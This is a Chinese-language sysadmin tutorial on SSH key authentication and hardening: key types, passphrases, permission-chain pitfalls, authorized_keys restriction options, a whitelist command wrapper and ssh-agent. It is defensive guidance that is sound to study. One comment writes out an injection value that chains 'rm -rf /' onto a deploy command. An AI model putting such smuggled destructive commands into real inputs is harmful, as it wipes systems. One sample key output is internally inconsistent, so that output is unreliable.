---
title: "SSH 金鑰認證與 ssh-agent"
desc: "把免密碼登入升級成可稽核、可輪替、可交接的金鑰制度：型別選擇、authorized_keys 限制選項、ssh-agent 與 agent forwarding 風險、全機金鑰盤點腳本"
aliases: [ssh-keygen, ssh-agent, ssh-copy-id, authorized_keys, 公鑰認證, agent forwarding, 部署金鑰]
tags: [群組/Linux, 服務/ssh, 主題/認證, 主題/金鑰管理]
category: SSH與遠端管理
difficulty: 進階
status: 完成
distro: [ubuntu, rhel]
prerequisites: ["[[01-SSH-原理與第一次連線]]", "[[08-檔案權限與擁有者]]"]
updated: 2026-08-28
---

# SSH 金鑰認證與 ssh-agent

> [!abstract] 這篇你會學到
> - 依用途選對**金鑰型別**（ed25519 為預設、rsa-4096 只給老設備、ecdsa 不用、dsa 已被移除），並用**註解欄**建立日後唯一的盤點線索
> - 把公鑰正確部署到伺服器，並看懂**權限錯誤導致 sshd 靜默拒絕**（StrictModes）時，錯誤訊息藏在哪裡 ★★★★
> - 用 `authorized_keys` 的 **`restrict` / `from=` / `command=` / `expiry-time=`** 把部署金鑰、備份金鑰、監控金鑰限縮成單一用途 ★★★★
> - 正確使用 **ssh-agent**（含 systemd user unit 常駐、WSL 與桌面環境差異），並用 `IdentitiesOnly` 解決「Too many authentication failures」
> - 理解 **`ssh -A` agent forwarding 等於把你的身分借給跳板機上的 root** ★★★★★，並改用 `ProxyJump`
> - 產出**全機金鑰稽核腳本**與**「先加新、再刪舊」輪替流程**，交出稽核查得動的金鑰清冊 ★★★★

> [!danger] ★★★★ 動手前先讀這段：不要把自己鎖在外面
> 本篇所有操作都在「**保留一條既有的可用連線**」的前提下進行。
>
> ```
> 【終端 A】← 已經登入伺服器的那一條，全程不要關、不要 exit
> 【終端 B】← 所有測試都在這裡另開新連線驗證
> ```
>
> 金鑰部署完成、**在終端 B 實測登入成功**之前，
> 不可以去 [[04-sshd-伺服器端設定]] 或 [[07-SSH-安全強化]] 關閉密碼登入。
> 順序錯了，你會需要 IPMI／iDRAC／主控台或機房才能救回來。

## 前置知識

- [[01-SSH-原理與第一次連線]] — 主機金鑰、known_hosts 與第一次連線的信任建立
- [[08-檔案權限與擁有者]] — `chmod` 的 rwx 模型（本篇只講「SSH 要求哪些權限」，不重講權限本身）
- [[09-使用者與群組管理]] — 建立維運帳號與服務帳號
- [[17-systemd服務管理]] — 後面會用 systemd user unit 常駐 ssh-agent

---

## 觀念說明

### 公鑰認證到底在做什麼

密碼認證是「我把秘密送給你，你比對」；公鑰認證是「**秘密永遠不離開我的機器**」。

```
                客戶端                                    伺服器 sshd
                  │                                            │
   ① 我想用這把公鑰登入 ops   ─── 公鑰指紋 ────────────────►    │
                  │                                            │
                  │                       ② 查 ~ops/.ssh/authorized_keys
                  │                          有這把公鑰嗎？
                  │                          （順便檢查家目錄權限 ← StrictModes）
                  │                                            │
                  │   ◄──────── ③ 這串隨機資料，簽給我看 ───────│
                  │                                            │
   ④ 用【私鑰】簽名  ──── 簽章（私鑰本身沒有送出）──────────►    │
                  │                                            │
                  │                       ⑤ 用公鑰驗簽 → 通過   │
                  │   ◄──────────── ⑥ 登入成功 ────────────────│
```

★★★ 關鍵在第 ④ 步：**私鑰從頭到尾沒有離開你的電腦**。
所以就算伺服器被入侵、記憶體被 dump，攻擊者也拿不到你的私鑰。
這是金鑰認證勝過密碼認證最本質的地方 —— 不是「比較方便」，是「**伺服器端根本沒有可偷的東西**」。

### 三種認證方式的取捨

| 方式 | 伺服器端存了什麼 | 被入侵時的損失 | 可稽核性 | 適用 |
| --- | --- | --- | --- | --- |
| 密碼 | 密碼雜湊（`/etc/shadow`） | ★★★★ 雜湊外洩可離線破解，且同一組密碼常被重複使用 | 差，只知道帳號 | 不建議用於對外伺服器 |
| **公鑰** | **只有公鑰** | ★ 公鑰是公開資訊，外洩無害 | 中，靠**註解欄**與指紋辨識是誰 | **機關維運預設做法** |
| SSH 憑證（CA 簽發） | 只有 CA 公鑰 | ★ 同上，且憑證有效期短 | 佳，憑證帶 principal 與序號 | 大規模環境，見 [[07-SSH-安全強化]] |

> [!note] 金鑰不是「免密碼」，是「換一種秘密」
> 很多人把 SSH 金鑰理解成「省掉打密碼的麻煩」，於是產生一把**沒有 passphrase** 的私鑰
> 丟在筆電上。這等於把一張**明文的萬用通行證**放在最容易被偷的裝置裡。
>
> ★★★★ **沒有 passphrase 的私鑰 = 明文憑證。**
> 筆電被偷、備份磁碟外流、誤把家目錄同步到雲端 —— 任何一件事發生，
> 拿到檔案的人立刻就是你。passphrase 是私鑰外洩後**唯一**的一道防線。

### 從「個人技巧」升級成「機關制度」

這是本篇真正想教的事。同樣是公鑰登入，個人做法與機關做法差很多：

| 面向 | 個人做法（不合格） | 機關做法（本篇目標） | 星級 |
| --- | --- | --- | --- |
| 金鑰歸屬 | 全組共用一把 `id_rsa` | **一人一把**，註解含姓名與年份 | ★★★★ |
| passphrase | 空的（方便） | 一律設定，靠 ssh-agent 只輸入一次 | ★★★★ |
| 機器帳號 | 直接借用某個人的金鑰 | 專用金鑰 + `restrict,from=,command=` | ★★★★ |
| 盤點 | 沒有清冊，沒人知道有幾把 | 定期全機掃描 `authorized_keys` 產出 CSV | ★★★★ |
| 輪替／離職 | 忘了刪，殭屍金鑰放到天荒地老 | 先加新後刪舊三步驟 + 離職當日 checklist | ★★★★ |
| 跳板 | `ssh -A` 一路轉發 | `ProxyJump`，跳板機**不持有**任何身分 | ★★★★★ |

> [!warning] ★★★★ 稽核最常被抓的三個缺失
> 1. **殭屍金鑰**：離職三年的同仁公鑰還在 `authorized_keys` 裡。
> 2. **無註解的公鑰**：`ssh-rsa AAAA... user@localhost`，沒人知道那是誰、哪一年放的、能不能刪。
> 3. **CI 用個人金鑰**：自動化腳本借用某工程師的私鑰，該員離職後系統一起掛掉，
>    而且所有自動化操作的稽核軌跡都掛在那個人頭上。

### 金鑰型別決策表 ★★★

```bash
ssh-keygen --help 2>&1 | grep -A1 -- '-t ecdsa'
```

預期輸出（Ubuntu 26.04 / OpenSSH 10.2）：

```text
                  [-t ecdsa | ecdsa-sk | ed25519 | ed25519-sk | rsa]
```

★★★ 注意這份清單裡**已經沒有 `dsa`**。

| 型別 | 產生指令 | 何時用 | 星級 |
| --- | --- | --- | --- |
| **ed25519** | `ssh-keygen -t ed25519 -a 100` | **預設首選**。公鑰只有一行短短的、簽驗都快、無 NIST 曲線參數來源疑慮、固定 256-bit 安全強度 | ★★★★ |
| **rsa 4096** | `ssh-keygen -t rsa -b 4096 -a 100` | **只在對接舊設備時用**：老交換器、老的網管系統、部分廠商設備韌體只吃 RSA | ★★★ |
| ecdsa | `ssh-keygen -t ecdsa -b 521` | **不建議**。相容性沒有比 RSA 好、安全性沒有比 ed25519 好，曲線參數來源有爭議 | ★★ |
| ~~dsa~~ | 已無此選項 | **不能用**。OpenSSH 9.8 起編譯預設停用、**10.0 起完整移除**；還在用 DSA 的設備等於在用 160-bit 金鑰 + SHA-1 | ★★★★★ |
| **ed25519-sk** | `ssh-keygen -t ed25519-sk` | 綁 FIDO2 硬體金鑰（YubiKey 等），需 OpenSSH 8.2+。私鑰無法被複製走 | ★★★★ |
| ecdsa-sk | `ssh-keygen -t ecdsa-sk` | 硬體金鑰不支援 ed25519-sk 時的替代 | ★★ |

> [!tip] rsa 的 `-b` 底線
> 要用 RSA 就至少 3072（OpenSSH 預設）、機關環境建議 **4096**。
> ★★★ **1024-bit RSA 視同已淘汰**，盤點時掃到就要當缺失處理。
> OpenSSH 從 8.8 起預設也不再接受 `ssh-rsa`（RSA + SHA-1）簽章演算法，
> 但 `rsa-sha2-256/512` 仍可用，所以 4096-bit RSA 金鑰本身沒問題，
> 有問題的是**老伺服器只會用 SHA-1 簽**的情況。

---

## 基礎操作

### 一、產生金鑰

```bash
ssh-keygen -t ed25519 -a 100 -C "ops-wangxm-2026" -f ~/.ssh/id_ed25519_ops
```

預期輸出：

```text
Generating public/private ed25519 key pair.
Enter passphrase for "/home/wangxm/.ssh/id_ed25519_ops" (empty for no passphrase):   # ★★★★ 一定要填
Enter same passphrase again:
Your identification has been saved in /home/wangxm/.ssh/id_ed25519_ops
Your public key has been saved in /home/wangxm/.ssh/id_ed25519_ops.pub
The key fingerprint is:
SHA256:cNgXnpcfTlWLmrBBnVB63+416+aHzJNnF/R1+K+gMlQ ops-wangxm-2026   # ★★★ 這串指紋就是日後盤點的身分證
The key's randomart image is:
+--[ED25519 256]--+
|         o=..   +|
...
+----[SHA256]-----+
```

三個參數的意義：

| 參數 | 意義 | 星級 |
| --- | --- | --- |
| `-t ed25519` | 金鑰型別 | ★★★ |
| `-a 100` | **私鑰檔加密的 bcrypt KDF 迭代次數**。數字越大，別人拿到私鑰檔後暴力猜 passphrase 越慢。只影響**開檔**，不影響連線速度 | ★★★ |
| `-C "ops-wangxm-2026"` | **註解欄**。這是日後盤點時**唯一**能認出「這是誰的、什麼用途、哪一年發的」的線索 | ★★★★ |

> [!danger] ★★★★ 註解欄的命名慣例是本篇最重要的一條紀律
> `ssh-keygen` 預設會把註解填成 `使用者@主機名`（例如 `wangxm@NB-1042`）。
> 這在筆電換機、主機改名之後就**完全失去意義**，稽核時看到只能猜。
>
> 機關統一格式：**`用途-識別-年份`**
>
> | 情境 | 註解範例 | 說明 |
> | --- | --- | --- |
> | 個人維運金鑰 | `ops-wangxm-2026` | 用途 + 姓名代號 + 發放年份 |
> | 個人金鑰（第二台裝置） | `ops-wangxm-nb2-2026` | 同一人不同裝置分開，被偷時只撤一把 |
> | CI 部署金鑰 | `deploy-ci-portal-2026` | 用途 + 系統 + 年份 |
> | 備份金鑰 | `backup-nas-pull-2026` | |
> | 監控金鑰 | `monitor-zabbix-2026` | |
>
> 年份在裡面，是為了讓「**這把該輪替了**」一眼看得出來。

> [!info]- Rocky / AlmaLinux（RHEL 系）對照
> 產生金鑰的指令完全相同，`openssh-clients` 套件預設已安裝。
> 差別在**部署之後**：
>
> ```bash
> sudo dnf install -y openssh-clients openssh-server
>
> # ★★★★ SELinux：手動建立的 .ssh 目錄 context 會是錯的，sshd 讀不到
> sudo restorecon -R -v /home/ops/.ssh
> ```
>
> 預期輸出：
>
> ```text
> Relabeled /home/ops/.ssh from unconfined_u:object_r:user_home_t:s0 to unconfined_u:object_r:ssh_home_t:s0
> Relabeled /home/ops/.ssh/authorized_keys from unconfined_u:object_r:user_home_t:s0 to unconfined_u:object_r:ssh_home_t:s0
> ```
>
> ★★★★ SELinux 為 `Enforcing` 時，context 不是 `ssh_home_t` 的 `authorized_keys`
> **會被 sshd 忽略**，症狀跟權限錯一模一樣（要求密碼），但 `ls -l` 看起來完全正常。
> 查驗方式：
>
> ```bash
> ls -Z /home/ops/.ssh/authorized_keys
> sudo ausearch -m avc -ts recent | grep ssh
> ```
>
> `ssh-copy-id` 因為是走一般 shell 建檔，**同樣會踩到這個坑**；用它之後仍要 `restorecon`。

### 二、passphrase 的三個實務操作

**（1）事後補設或更換 passphrase** ★★★★

發現同仁的私鑰沒有 passphrase 時，不需要重發金鑰（公鑰不變、不用重新部署）：

```bash
ssh-keygen -p -a 100 -f ~/.ssh/id_ed25519_ops
```

預期輸出：

```text
Key has comment 'ops-wangxm-2026'
Enter new passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved with the new passphrase.
```

**（2）檢查一把私鑰到底有沒有 passphrase** ★★★★

這是稽核用的技巧 —— 用空密碼去開它，開得起來就代表**沒有保護**：

```bash
ssh-keygen -y -P "" -f ~/.ssh/id_ed25519_ops
```

有 passphrase（正確狀態）：

```text
Load key "/home/wangxm/.ssh/id_ed25519_ops": incorrect passphrase supplied to decrypt private key
```

沒有 passphrase（★★★★ 高風險，要立刻補設）：

```text
ssh-ed25519 AAAAB3NzaC1yc2EAAAADAQABAAACAQDI... backup-nas-pull-2026
```

★★★ 判斷準則：**指令印出公鑰 = 私鑰沒有加密**。exit code 0 就是不合格。

**（3）公鑰弄丟了，從私鑰重生** ★★★

`.pub` 檔刪掉不是災難，私鑰裡本來就含有公鑰：

```bash
ssh-keygen -y -f ~/.ssh/id_ed25519_ops > ~/.ssh/id_ed25519_ops.pub
```

預期輸出（會先問 passphrase）：

```text
Enter passphrase for "/home/wangxm/.ssh/id_ed25519_ops":
```

> [!warning] ★★★ `-y` 重生的公鑰**沒有註解欄**
> 因為註解存在 `.pub` 檔裡，不在私鑰的公鑰結構裡（OpenSSH 新格式的私鑰檔其實有存，
> 但 `-y` 的輸出不帶）。重生之後記得手動補回去：
>
> ```bash
> sed -i 's|$| ops-wangxm-2026|' ~/.ssh/id_ed25519_ops.pub
> ```

**（4）私鑰檔的兩種格式**

```bash
head -1 ~/.ssh/id_ed25519_ops
```

| 開頭這行 | 格式 | 說明 | 星級 |
| --- | --- | --- | --- |
| `-----BEGIN OPENSSH PRIVATE KEY-----` | **OpenSSH 新格式** | OpenSSH 7.8 起的預設。支援 bcrypt KDF（`-a`），暴力破解 passphrase 慢得多 | ★★★ |
| `-----BEGIN RSA PRIVATE KEY-----` | 舊 PEM（PKCS#1） | 舊工具（某些 Java／Jenkins 外掛、老版 PuTTY、部分網管軟體）只吃這種 | ★★★ |
| `-----BEGIN ENCRYPTED PRIVATE KEY-----` | PKCS#8 | `-m PKCS8` 產出 | ★★ |

需要轉成舊 PEM 給老工具用時（★★ 注意：PEM 的加密強度較弱）：

```bash
cp ~/.ssh/id_rsa_legacy ~/.ssh/id_rsa_legacy.pem
ssh-keygen -p -m PEM -f ~/.ssh/id_rsa_legacy.pem
```

★★★ ed25519 **沒有** PEM 格式可轉；老工具不支援時只能改用 RSA。

### 三、部署公鑰的三種方式與各自的坑

**方式 A：`ssh-copy-id`（最省事，但要先能用密碼登入）**

```bash
ssh-copy-id -i ~/.ssh/id_ed25519_ops.pub ops@10.10.20.31
```

預期輸出：

```text
/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: "/home/wangxm/.ssh/id_ed25519_ops.pub"
/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed
/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys
ops@10.10.20.31's password:

Number of key(s) added: 1

Now try logging into the machine, with:   "ssh 'ops@10.10.20.31'"
and check to make sure that only the key(s) you wanted were added.
```

★★★ `ssh-copy-id` 實際在遠端跑的，大致等於：

```bash
umask 077
mkdir -p ~/.ssh
touch ~/.ssh/authorized_keys
cat >> ~/.ssh/authorized_keys        # 把公鑰附加到檔尾
restorecon -F -R -v ~/.ssh || true   # ★ RHEL 系才有作用
```

> [!warning] ★★★★ `ssh-copy-id` 的三個坑
> 1. **`-i` 沒給就會亂送**：不加 `-i` 時它會把 agent 裡與 `~/.ssh` 底下**所有**公鑰
>    一起送上去。機關環境一定要明確指定 `-i xxx.pub`。
> 2. **它不會修正家目錄權限**：`~` 本身如果是 775（群組可寫），它照樣寫成功，
>    但你之後登不進去（見下面 StrictModes）。
> 3. **需要先能用密碼登入**：密碼登入已經關掉的伺服器用不了這招，
>    要改用既有的可用連線手動貼、或走設定管理工具。

**方式 B：手動部署（密碼登入已關閉時的做法）**

在**終端 A（既有的可用連線）**上執行：

```bash
# 【1】建立目錄，用 umask 一次把權限做對
umask 077
mkdir -p ~/.ssh

# 【2】附加公鑰。★★★★ 一定是 >> 不是 >，用 > 會把別人的金鑰洗掉
cat >> ~/.ssh/authorized_keys <<'EOF'
# 王小明 資訊室 2026 發放
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINU/8gyUxwy4X6wrm1+PsaK+akfWjwibwpITxmXX17ct ops-wangxm-2026
EOF

# 【3】把整條權限鏈補正
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
chmod go-w ~                      # ★★★★ 最常被忽略的一步
```

驗證：

```bash
ls -ld ~ ~/.ssh ~/.ssh/authorized_keys
```

預期輸出：

```text
drwxr-x--- 5 ops  ops  4096 Aug 28 10:22 /home/ops          # ★★★★ 中間那組不能有 w
drwx------ 2 ops  ops  4096 Aug 28 10:22 /home/ops/.ssh     # 700
-rw------- 1 ops  ops   412 Aug 28 10:22 /home/ops/.ssh/authorized_keys   # 600
```

**★★★★ SSH 的權限鏈（三層都要對，錯一層就靜默失敗）**

| 路徑 | 要求 | 常見錯法 | 後果 |
| --- | --- | --- | --- |
| `/home/ops`（家目錄） | **不可群組可寫、不可其他人可寫**（`755`、`750`、`700` 皆可） | `775`、`777`、`chown` 給錯人 | ★★★★ sshd 直接忽略 `authorized_keys` |
| `/home/ops/.ssh` | `700` | `755` | ★★★★ 同上 |
| `/home/ops/.ssh/authorized_keys` | `600`（`644` 在 StrictModes 下也可，但不建議） | 群組／其他人可寫 | ★★★★ 同上 |
| 檔案擁有者 | 必須是**該帳號本人或 root** | 用 `sudo` 建檔忘了 `chown` | ★★★★ 同上 |

> [!danger] ★★★★ StrictModes 的靜默失敗：客戶端完全看不到原因
> `sshd_config` 的 `StrictModes yes`（**預設值**）會在讀 `authorized_keys` 之前
> 先檢查家目錄與 `.ssh` 的擁有者與權限。**不通過就當作沒有這個檔案**，
> 直接跳到下一種認證方式（通常就是要你打密碼）。
>
> **客戶端只會看到**（就算加 `-vvv` 也一樣）：
>
> ```text
> ops@10.10.20.31: Permission denied (publickey,password).
> ```
>
> **真正的原因只在伺服器端的日誌裡**：
>
> ```bash
> sudo journalctl -u ssh -n 50 --no-pager | grep -i refused
> ```
>
> 預期輸出：
>
> ```text
> Aug 28 10:31:02 web01 sshd[2841]: Authentication refused: bad ownership or modes for directory /home/ops
> ```
>
> 或者：
>
> ```text
> Aug 28 10:33:17 web01 sshd[2903]: Authentication refused: bad ownership or modes for file /home/ops/.ssh/authorized_keys
> ```
>
> ★★★★ **「公鑰放好了卻還是要密碼」→ 先去伺服器看日誌，不要在客戶端瞎試。**
> 這一條可以省下你人生中好幾個小時。
> RHEL 系的服務名是 `sshd`：`journalctl -u sshd`。

**方式 C：由設定管理工具佈署（規模化的正解）**

三台以上就不要手動貼。用 Ansible／cloud-init／組態管理把 `authorized_keys` 當成
**受版控的設定檔**整份覆蓋（而不是附加），這樣「刪掉某人的金鑰」才會真的生效在每一台上。
做法見 [[05-自動化佈建入門]]。

★★★ 整份覆蓋的好處：**離職清除只要改一個檔案再推一次**，不用擔心漏掉某台機器。

### 四、★★★★ 驗證：另開終端實測（這一步不能跳）

**終端 A 保持連線不動**，在**終端 B**執行：

```bash
ssh -o PreferredAuthentications=publickey -o PasswordAuthentication=no \
    -i ~/.ssh/id_ed25519_ops ops@10.10.20.31 'id; hostname'
```

預期輸出（成功）：

```text
Enter passphrase for key '/home/wangxm/.ssh/id_ed25519_ops':
uid=1001(ops) gid=1001(ops) groups=1001(ops),27(sudo)
web01
```

★★★★ 這裡刻意用 `PasswordAuthentication=no`：**強迫只用公鑰**。
如果沒設這個，你可能是用密碼登進去的卻以為金鑰生效了，
等到之後真的把密碼登入關掉才發現金鑰根本沒work —— 那時已經進不去了。

失敗時（金鑰沒生效）：

```text
ops@10.10.20.31: Permission denied (publickey).
```

看到這行**先不要動 sshd_config**，回到終端 A 查日誌。排查流程見本篇〈排查步驟〉。

驗證細節（哪把金鑰被接受了）：

```bash
ssh -v -i ~/.ssh/id_ed25519_ops ops@10.10.20.31 true 2>&1 | grep -Ei 'offering|accepted|authenticat'
```

預期輸出：

```text
debug1: Offering public key: /home/wangxm/.ssh/id_ed25519_ops ED25519 SHA256:cNgXnpcfTlWLmrBBnVB63+416+aHzJNnF/R1+K+gMlQ explicit
debug1: Server accepts key: /home/wangxm/.ssh/id_ed25519_ops ED25519 SHA256:cNgXnpcfTlWLmrBBnVB63+416+aHzJNnF/R1+K+gMlQ explicit
debug1: Authentication succeeded (publickey).
```

★★★ `Server accepts key:` 後面那串指紋，就是伺服器上 `authorized_keys` 裡的那一把。
指紋對得起來，才算真的驗證完成。

---

## 進階應用

### 一、`authorized_keys` 的選項欄位 ★★★★（本篇最有價值的部分）

`authorized_keys` 的每一行其實有**四欄**，大多數人只用了後三欄：

```
[選項] <型別> <公鑰本體> <註解>
 ↑
 這一欄多數人是空的，但它才是把「一把萬能鑰匙」變成「只能開一扇門」的關鍵
```

**完整選項表**（`man 8 sshd` 的 AUTHORIZED_KEYS FILE FORMAT）：

| 選項 | 作用 | 星級 |
| --- | --- | --- |
| **`restrict`** | **一次關掉所有轉發、PTY 與 `~/.ssh/rc`**。★★★★ 機器帳號金鑰的起手式，未來 OpenSSH 新增的功能也預設關閉 | ★★★★ |
| **`from="pattern-list"`** | 限制來源主機／IP，逗號分隔，支援萬用字元與 `!` 否定（例：`from="10.10.0.0/16,!10.10.9.*"`） | ★★★★ |
| **`command="…"`** | **不管客戶端下什麼指令，一律只執行這一條**。原指令會放進 `$SSH_ORIGINAL_COMMAND` | ★★★★ |
| **`expiry-time="timespec"`** | 到期後這把金鑰不再被接受。格式 `YYYYMMDD` 或 `YYYYMMDDHHMM[SS]` | ★★★★ |
| `no-pty` | 不給終端機（`restrict` 已含） | ★★★ |
| `no-port-forwarding` | 禁止 `-L`／`-R` 埠轉發（`restrict` 已含） | ★★★ |
| `no-agent-forwarding` | 禁止 agent forwarding（`restrict` 已含） | ★★★★ |
| `no-X11-forwarding` | 禁止 X11 轉發（`restrict` 已含） | ★★ |
| `no-user-rc` | 不執行 `~/.ssh/rc`（`restrict` 已含） | ★★ |
| `permitopen="host:port"` | 在允許轉發的前提下，**只准轉發到這個目的地**（`-L` 用） | ★★★ |
| `permitlisten="[host:]port"` | 只准 `-R` 監聽這個埠 | ★★ |
| `pty` / `port-forwarding` / `agent-forwarding` / `X11-forwarding` / `user-rc` | **在 `restrict` 之後個別放行**某一項 | ★★★ |
| `environment="NAME=value"` | 注入環境變數（★★★ 需 sshd 開 `PermitUserEnvironment`，預設關閉且**不建議開**） | ★★ |
| `verify-required` | FIDO2 金鑰必須做使用者驗證（按 PIN／指紋），不只是碰一下 | ★★★★ |
| `no-touch-required` | FIDO2 金鑰免碰觸（★★★ 自動化才用，會削弱硬體金鑰的意義） | ★★ |
| `tunnel="n"` | 指定 `tun` 裝置編號 | ★ |
| `cert-authority` / `principals="…"` | 把該行當成 CA 公鑰使用（SSH 憑證，見 [[07-SSH-安全強化]]） | ★★★ |

**★★★★ 三個實務範本**（直接抄）：

```text
# ───── /home/deployer/.ssh/authorized_keys ─────

# 【1】CI 部署金鑰：只准從 CI 網段來，只准跑部署腳本，不給終端機、不給轉發
restrict,from="10.10.90.0/24",command="/usr/local/bin/deploy-wrapper",expiry-time="20271231" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI...aB1 deploy-ci-portal-2026

# 【2】備份主機拉取金鑰：只准從 NAS 來，只准跑 rsync 包裝腳本
restrict,from="10.10.30.11",command="/usr/local/bin/rrsync-ro /srv/data" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI...cD2 backup-nas-pull-2026

# 【3】監控金鑰：只准從監控主機來，只准跑一支唯讀檢查腳本
restrict,from="10.10.30.20",command="/usr/local/bin/health-report" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI...eF3 monitor-zabbix-2026

# 【4】人的金鑰：需要終端機，所以不用 restrict，但限制來源網段
from="10.10.20.0/24,10.10.21.0/24" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI...gH4 ops-wangxm-2026
```

> [!danger] ★★★★ 這四行的價值遠大於「把 SSH 改成 2222 埠」
> 改埠只是讓掃描器晚一點找到你，**攻擊者拿到部署金鑰照樣拿得到 shell**。
> 而 `restrict,from=,command=` 讓同一把金鑰即使外流：
> - 不在 CI 網段就**連不上**（`from=`）
> - 連上了也只能跑那一支腳本，**拿不到 shell**（`restrict` + `command=`）
> - 到期後自動失效（`expiry-time=`）
>
> 這是**縱深防禦**，不是障眼法。

**`command=` 的正確寫法：處理 `$SSH_ORIGINAL_COMMAND`** ★★★★

被 `command=` 綁住的金鑰，客戶端原本要跑的指令會被放進環境變數。
如果你的包裝腳本不看它，客戶端的 `rsync`／`git` 就會全部失敗：

```bash
sudo tee /usr/local/bin/deploy-wrapper > /dev/null <<'WRAP'
#!/usr/bin/env bash
# CI 部署金鑰的唯一入口。★★★★ 只允許白名單內的動作
set -euo pipefail

LOG=/var/log/deploy-wrapper.log
log() { printf '[%s] %s\n' "$(date '+%F %T')" "$*" >> "$LOG"; }

CMD="${SSH_ORIGINAL_COMMAND:-}"
log "來源=${SSH_CONNECTION%% *} 原指令=[${CMD}]"

case "$CMD" in
  "deploy "[a-zA-Z0-9._-]*)                       # deploy v1.2.0
    REF="${CMD#deploy }"
    exec /usr/local/sbin/deploy-portal.sh "$REF"
    ;;
  "rollback "[0-9a-f]*)                           # rollback a1b2c3d
    REF="${CMD#rollback }"
    exec /usr/local/sbin/deploy-portal.sh "$REF"
    ;;
  "status")
    exec /usr/local/sbin/deploy-portal.sh --status
    ;;
  "")
    echo "此金鑰不提供互動式登入。可用指令：deploy <ref> / rollback <sha> / status" >&2
    log "拒絕：嘗試互動式登入"
    exit 1
    ;;
  *)
    echo "指令未被允許：$CMD" >&2
    log "拒絕：未允許的指令 [$CMD]"
    exit 1
    ;;
esac
WRAP
sudo chmod 755 /usr/local/bin/deploy-wrapper
```

客戶端使用：

```bash
ssh -i ~/.ssh/deploy_ci deployer@10.10.20.31 "deploy v1.2.0"
```

嘗試拿 shell 時：

```bash
ssh -i ~/.ssh/deploy_ci deployer@10.10.20.31
```

預期輸出：

```text
此金鑰不提供互動式登入。可用指令：deploy <ref> / rollback <sha> / status
```

★★★ 注意 `case` 用了**白名單比對**而不是直接 `eval "$CMD"`。
`eval` 等於把 `command=` 的保護整個作廢 —— 對方送 `deploy v1; rm -rf /` 就照跑。

> [!tip] rsync 的現成包裝：`rrsync`
> Ubuntu 的 `rsync` 套件附了 `rrsync`（`/usr/bin/rrsync`，舊版在 `/usr/share/doc/rsync/scripts/`），
> 專門給 `command=` 用，可限制只能存取某個目錄、`-ro` 限唯讀：
>
> ```text
> restrict,from="10.10.30.11",command="rrsync -ro /srv/data" ssh-ed25519 AAAA... backup-nas-pull-2026
> ```
>
> 詳細用法見 [[02-rsync-同步與備份]]。

**`from=` 的實務陷阱** ★★★

```text
from="10.10.90.0/24"        # 網段（OpenSSH 支援 CIDR）
from="ci01.example.gov.tw"  # ★★★ 依賴反解 DNS，不建議
from="10.10.*,!10.10.9.*"   # 萬用字元 + 否定
```

| 陷阱 | 說明 | 星級 |
| --- | --- | --- |
| NAT 後的來源 IP | 伺服器看到的是 NAT **出口 IP**，不是客戶端內網 IP。用 `who`／日誌先確認真實來源 | ★★★★ |
| 用主機名 | 需要反解 DNS 且 sshd 要開 `UseDNS`（Ubuntu 預設 `no`），會失敗且變慢 | ★★★ |
| 走跳板機／ProxyJump | 伺服器看到的來源是**跳板機的 IP**，`from=` 要寫跳板機 | ★★★★ |
| IPv6 | 客戶端走 IPv6 時 `from="10.10.90.0/24"` 直接不符合，記得一併寫 IPv6 網段 | ★★★ |

驗證真實來源：

```bash
ssh ops@10.10.20.31 'echo $SSH_CONNECTION'
```

預期輸出：

```text
10.10.90.14 51422 10.10.20.31 22
 ↑ 伺服器看到的來源 IP，from= 就要寫這個
```

**`expiry-time=` 的格式** ★★★

```text
expiry-time="20271231"          # 2027-12-31 00:00 之後失效
expiry-time="202712312359"      # 到 2027-12-31 23:59
```

★★★★ 過期後是**靜默拒絕**（跟權限錯的症狀一樣，客戶端只看到 `Permission denied`）。
伺服器日誌會出現：

```text
Aug 28 09:14:02 web01 sshd[3311]: Authentication refused: expired key
```

所以**專案型、外包廠商、短期支援的金鑰一定要設 `expiry-time`** ——
這是唯一「忘了刪也不會出事」的機制。

### 二、ssh-agent：passphrase 只輸入一次

有了 passphrase 之後，每次 `ssh`、每次 `git push`、每次 `scp` 都要打一次，
於是同仁就會想把 passphrase 拿掉。**ssh-agent 就是為了避免這件事而存在的。**

```
            ┌──────────────────────────────────────────┐
            │  ssh-agent（記憶體中的行程）              │
            │  解密後的私鑰只存在這裡，【不寫硬碟】      │
            └────────────────┬─────────────────────────┘
                             │ Unix socket
              $SSH_AUTH_SOCK │ （檔案權限 600，只有你能連）
                             │
     ┌───────────┬───────────┴──────────┬────────────┐
     │           │                      │            │
   ssh          scp                    git          rsync
```

**基本操作**

```bash
eval "$(ssh-agent -s)"
```

預期輸出：

```text
Agent pid 42206
```

★★★ 為什麼要 `eval`？因為 `ssh-agent -s` 只是**印出**要設的環境變數，
必須讓目前這個 shell 真的去執行它們：

```bash
ssh-agent -s
```

預期輸出：

```text
SSH_AUTH_SOCK=/tmp/ssh-XXXXlKp3Ux/agent.42205; export SSH_AUTH_SOCK;
SSH_AGENT_PID=42206; export SSH_AGENT_PID;
echo Agent pid 42206;
```

加入金鑰：

```bash
ssh-add ~/.ssh/id_ed25519_ops
```

預期輸出：

```text
Enter passphrase for /home/wangxm/.ssh/id_ed25519_ops:
Identity added: /home/wangxm/.ssh/id_ed25519_ops (ops-wangxm-2026)
```

列出目前握有的金鑰：

```bash
ssh-add -l
```

預期輸出：

```text
256 SHA256:cNgXnpcfTlWLmrBBnVB63+416+aHzJNnF/R1+K+gMlQ ops-wangxm-2026 (ED25519)
```

沒有 agent 或 agent 是空的：

```text
The agent has no identities.          # agent 有跑但沒金鑰，exit code 1
```

```text
Could not open a connection to your authentication agent.   # ★★★ 根本沒有 agent，exit code 2
```

**`ssh-add` 常用旗標**

| 指令 | 作用 | 星級 |
| --- | --- | --- |
| `ssh-add -l` | 列出**指紋** | ★★★ |
| `ssh-add -L` | 列出**完整公鑰**（可直接 `>> authorized_keys`） | ★★★ |
| `ssh-add -d ~/.ssh/id_x` | 移除**單一**金鑰 | ★★ |
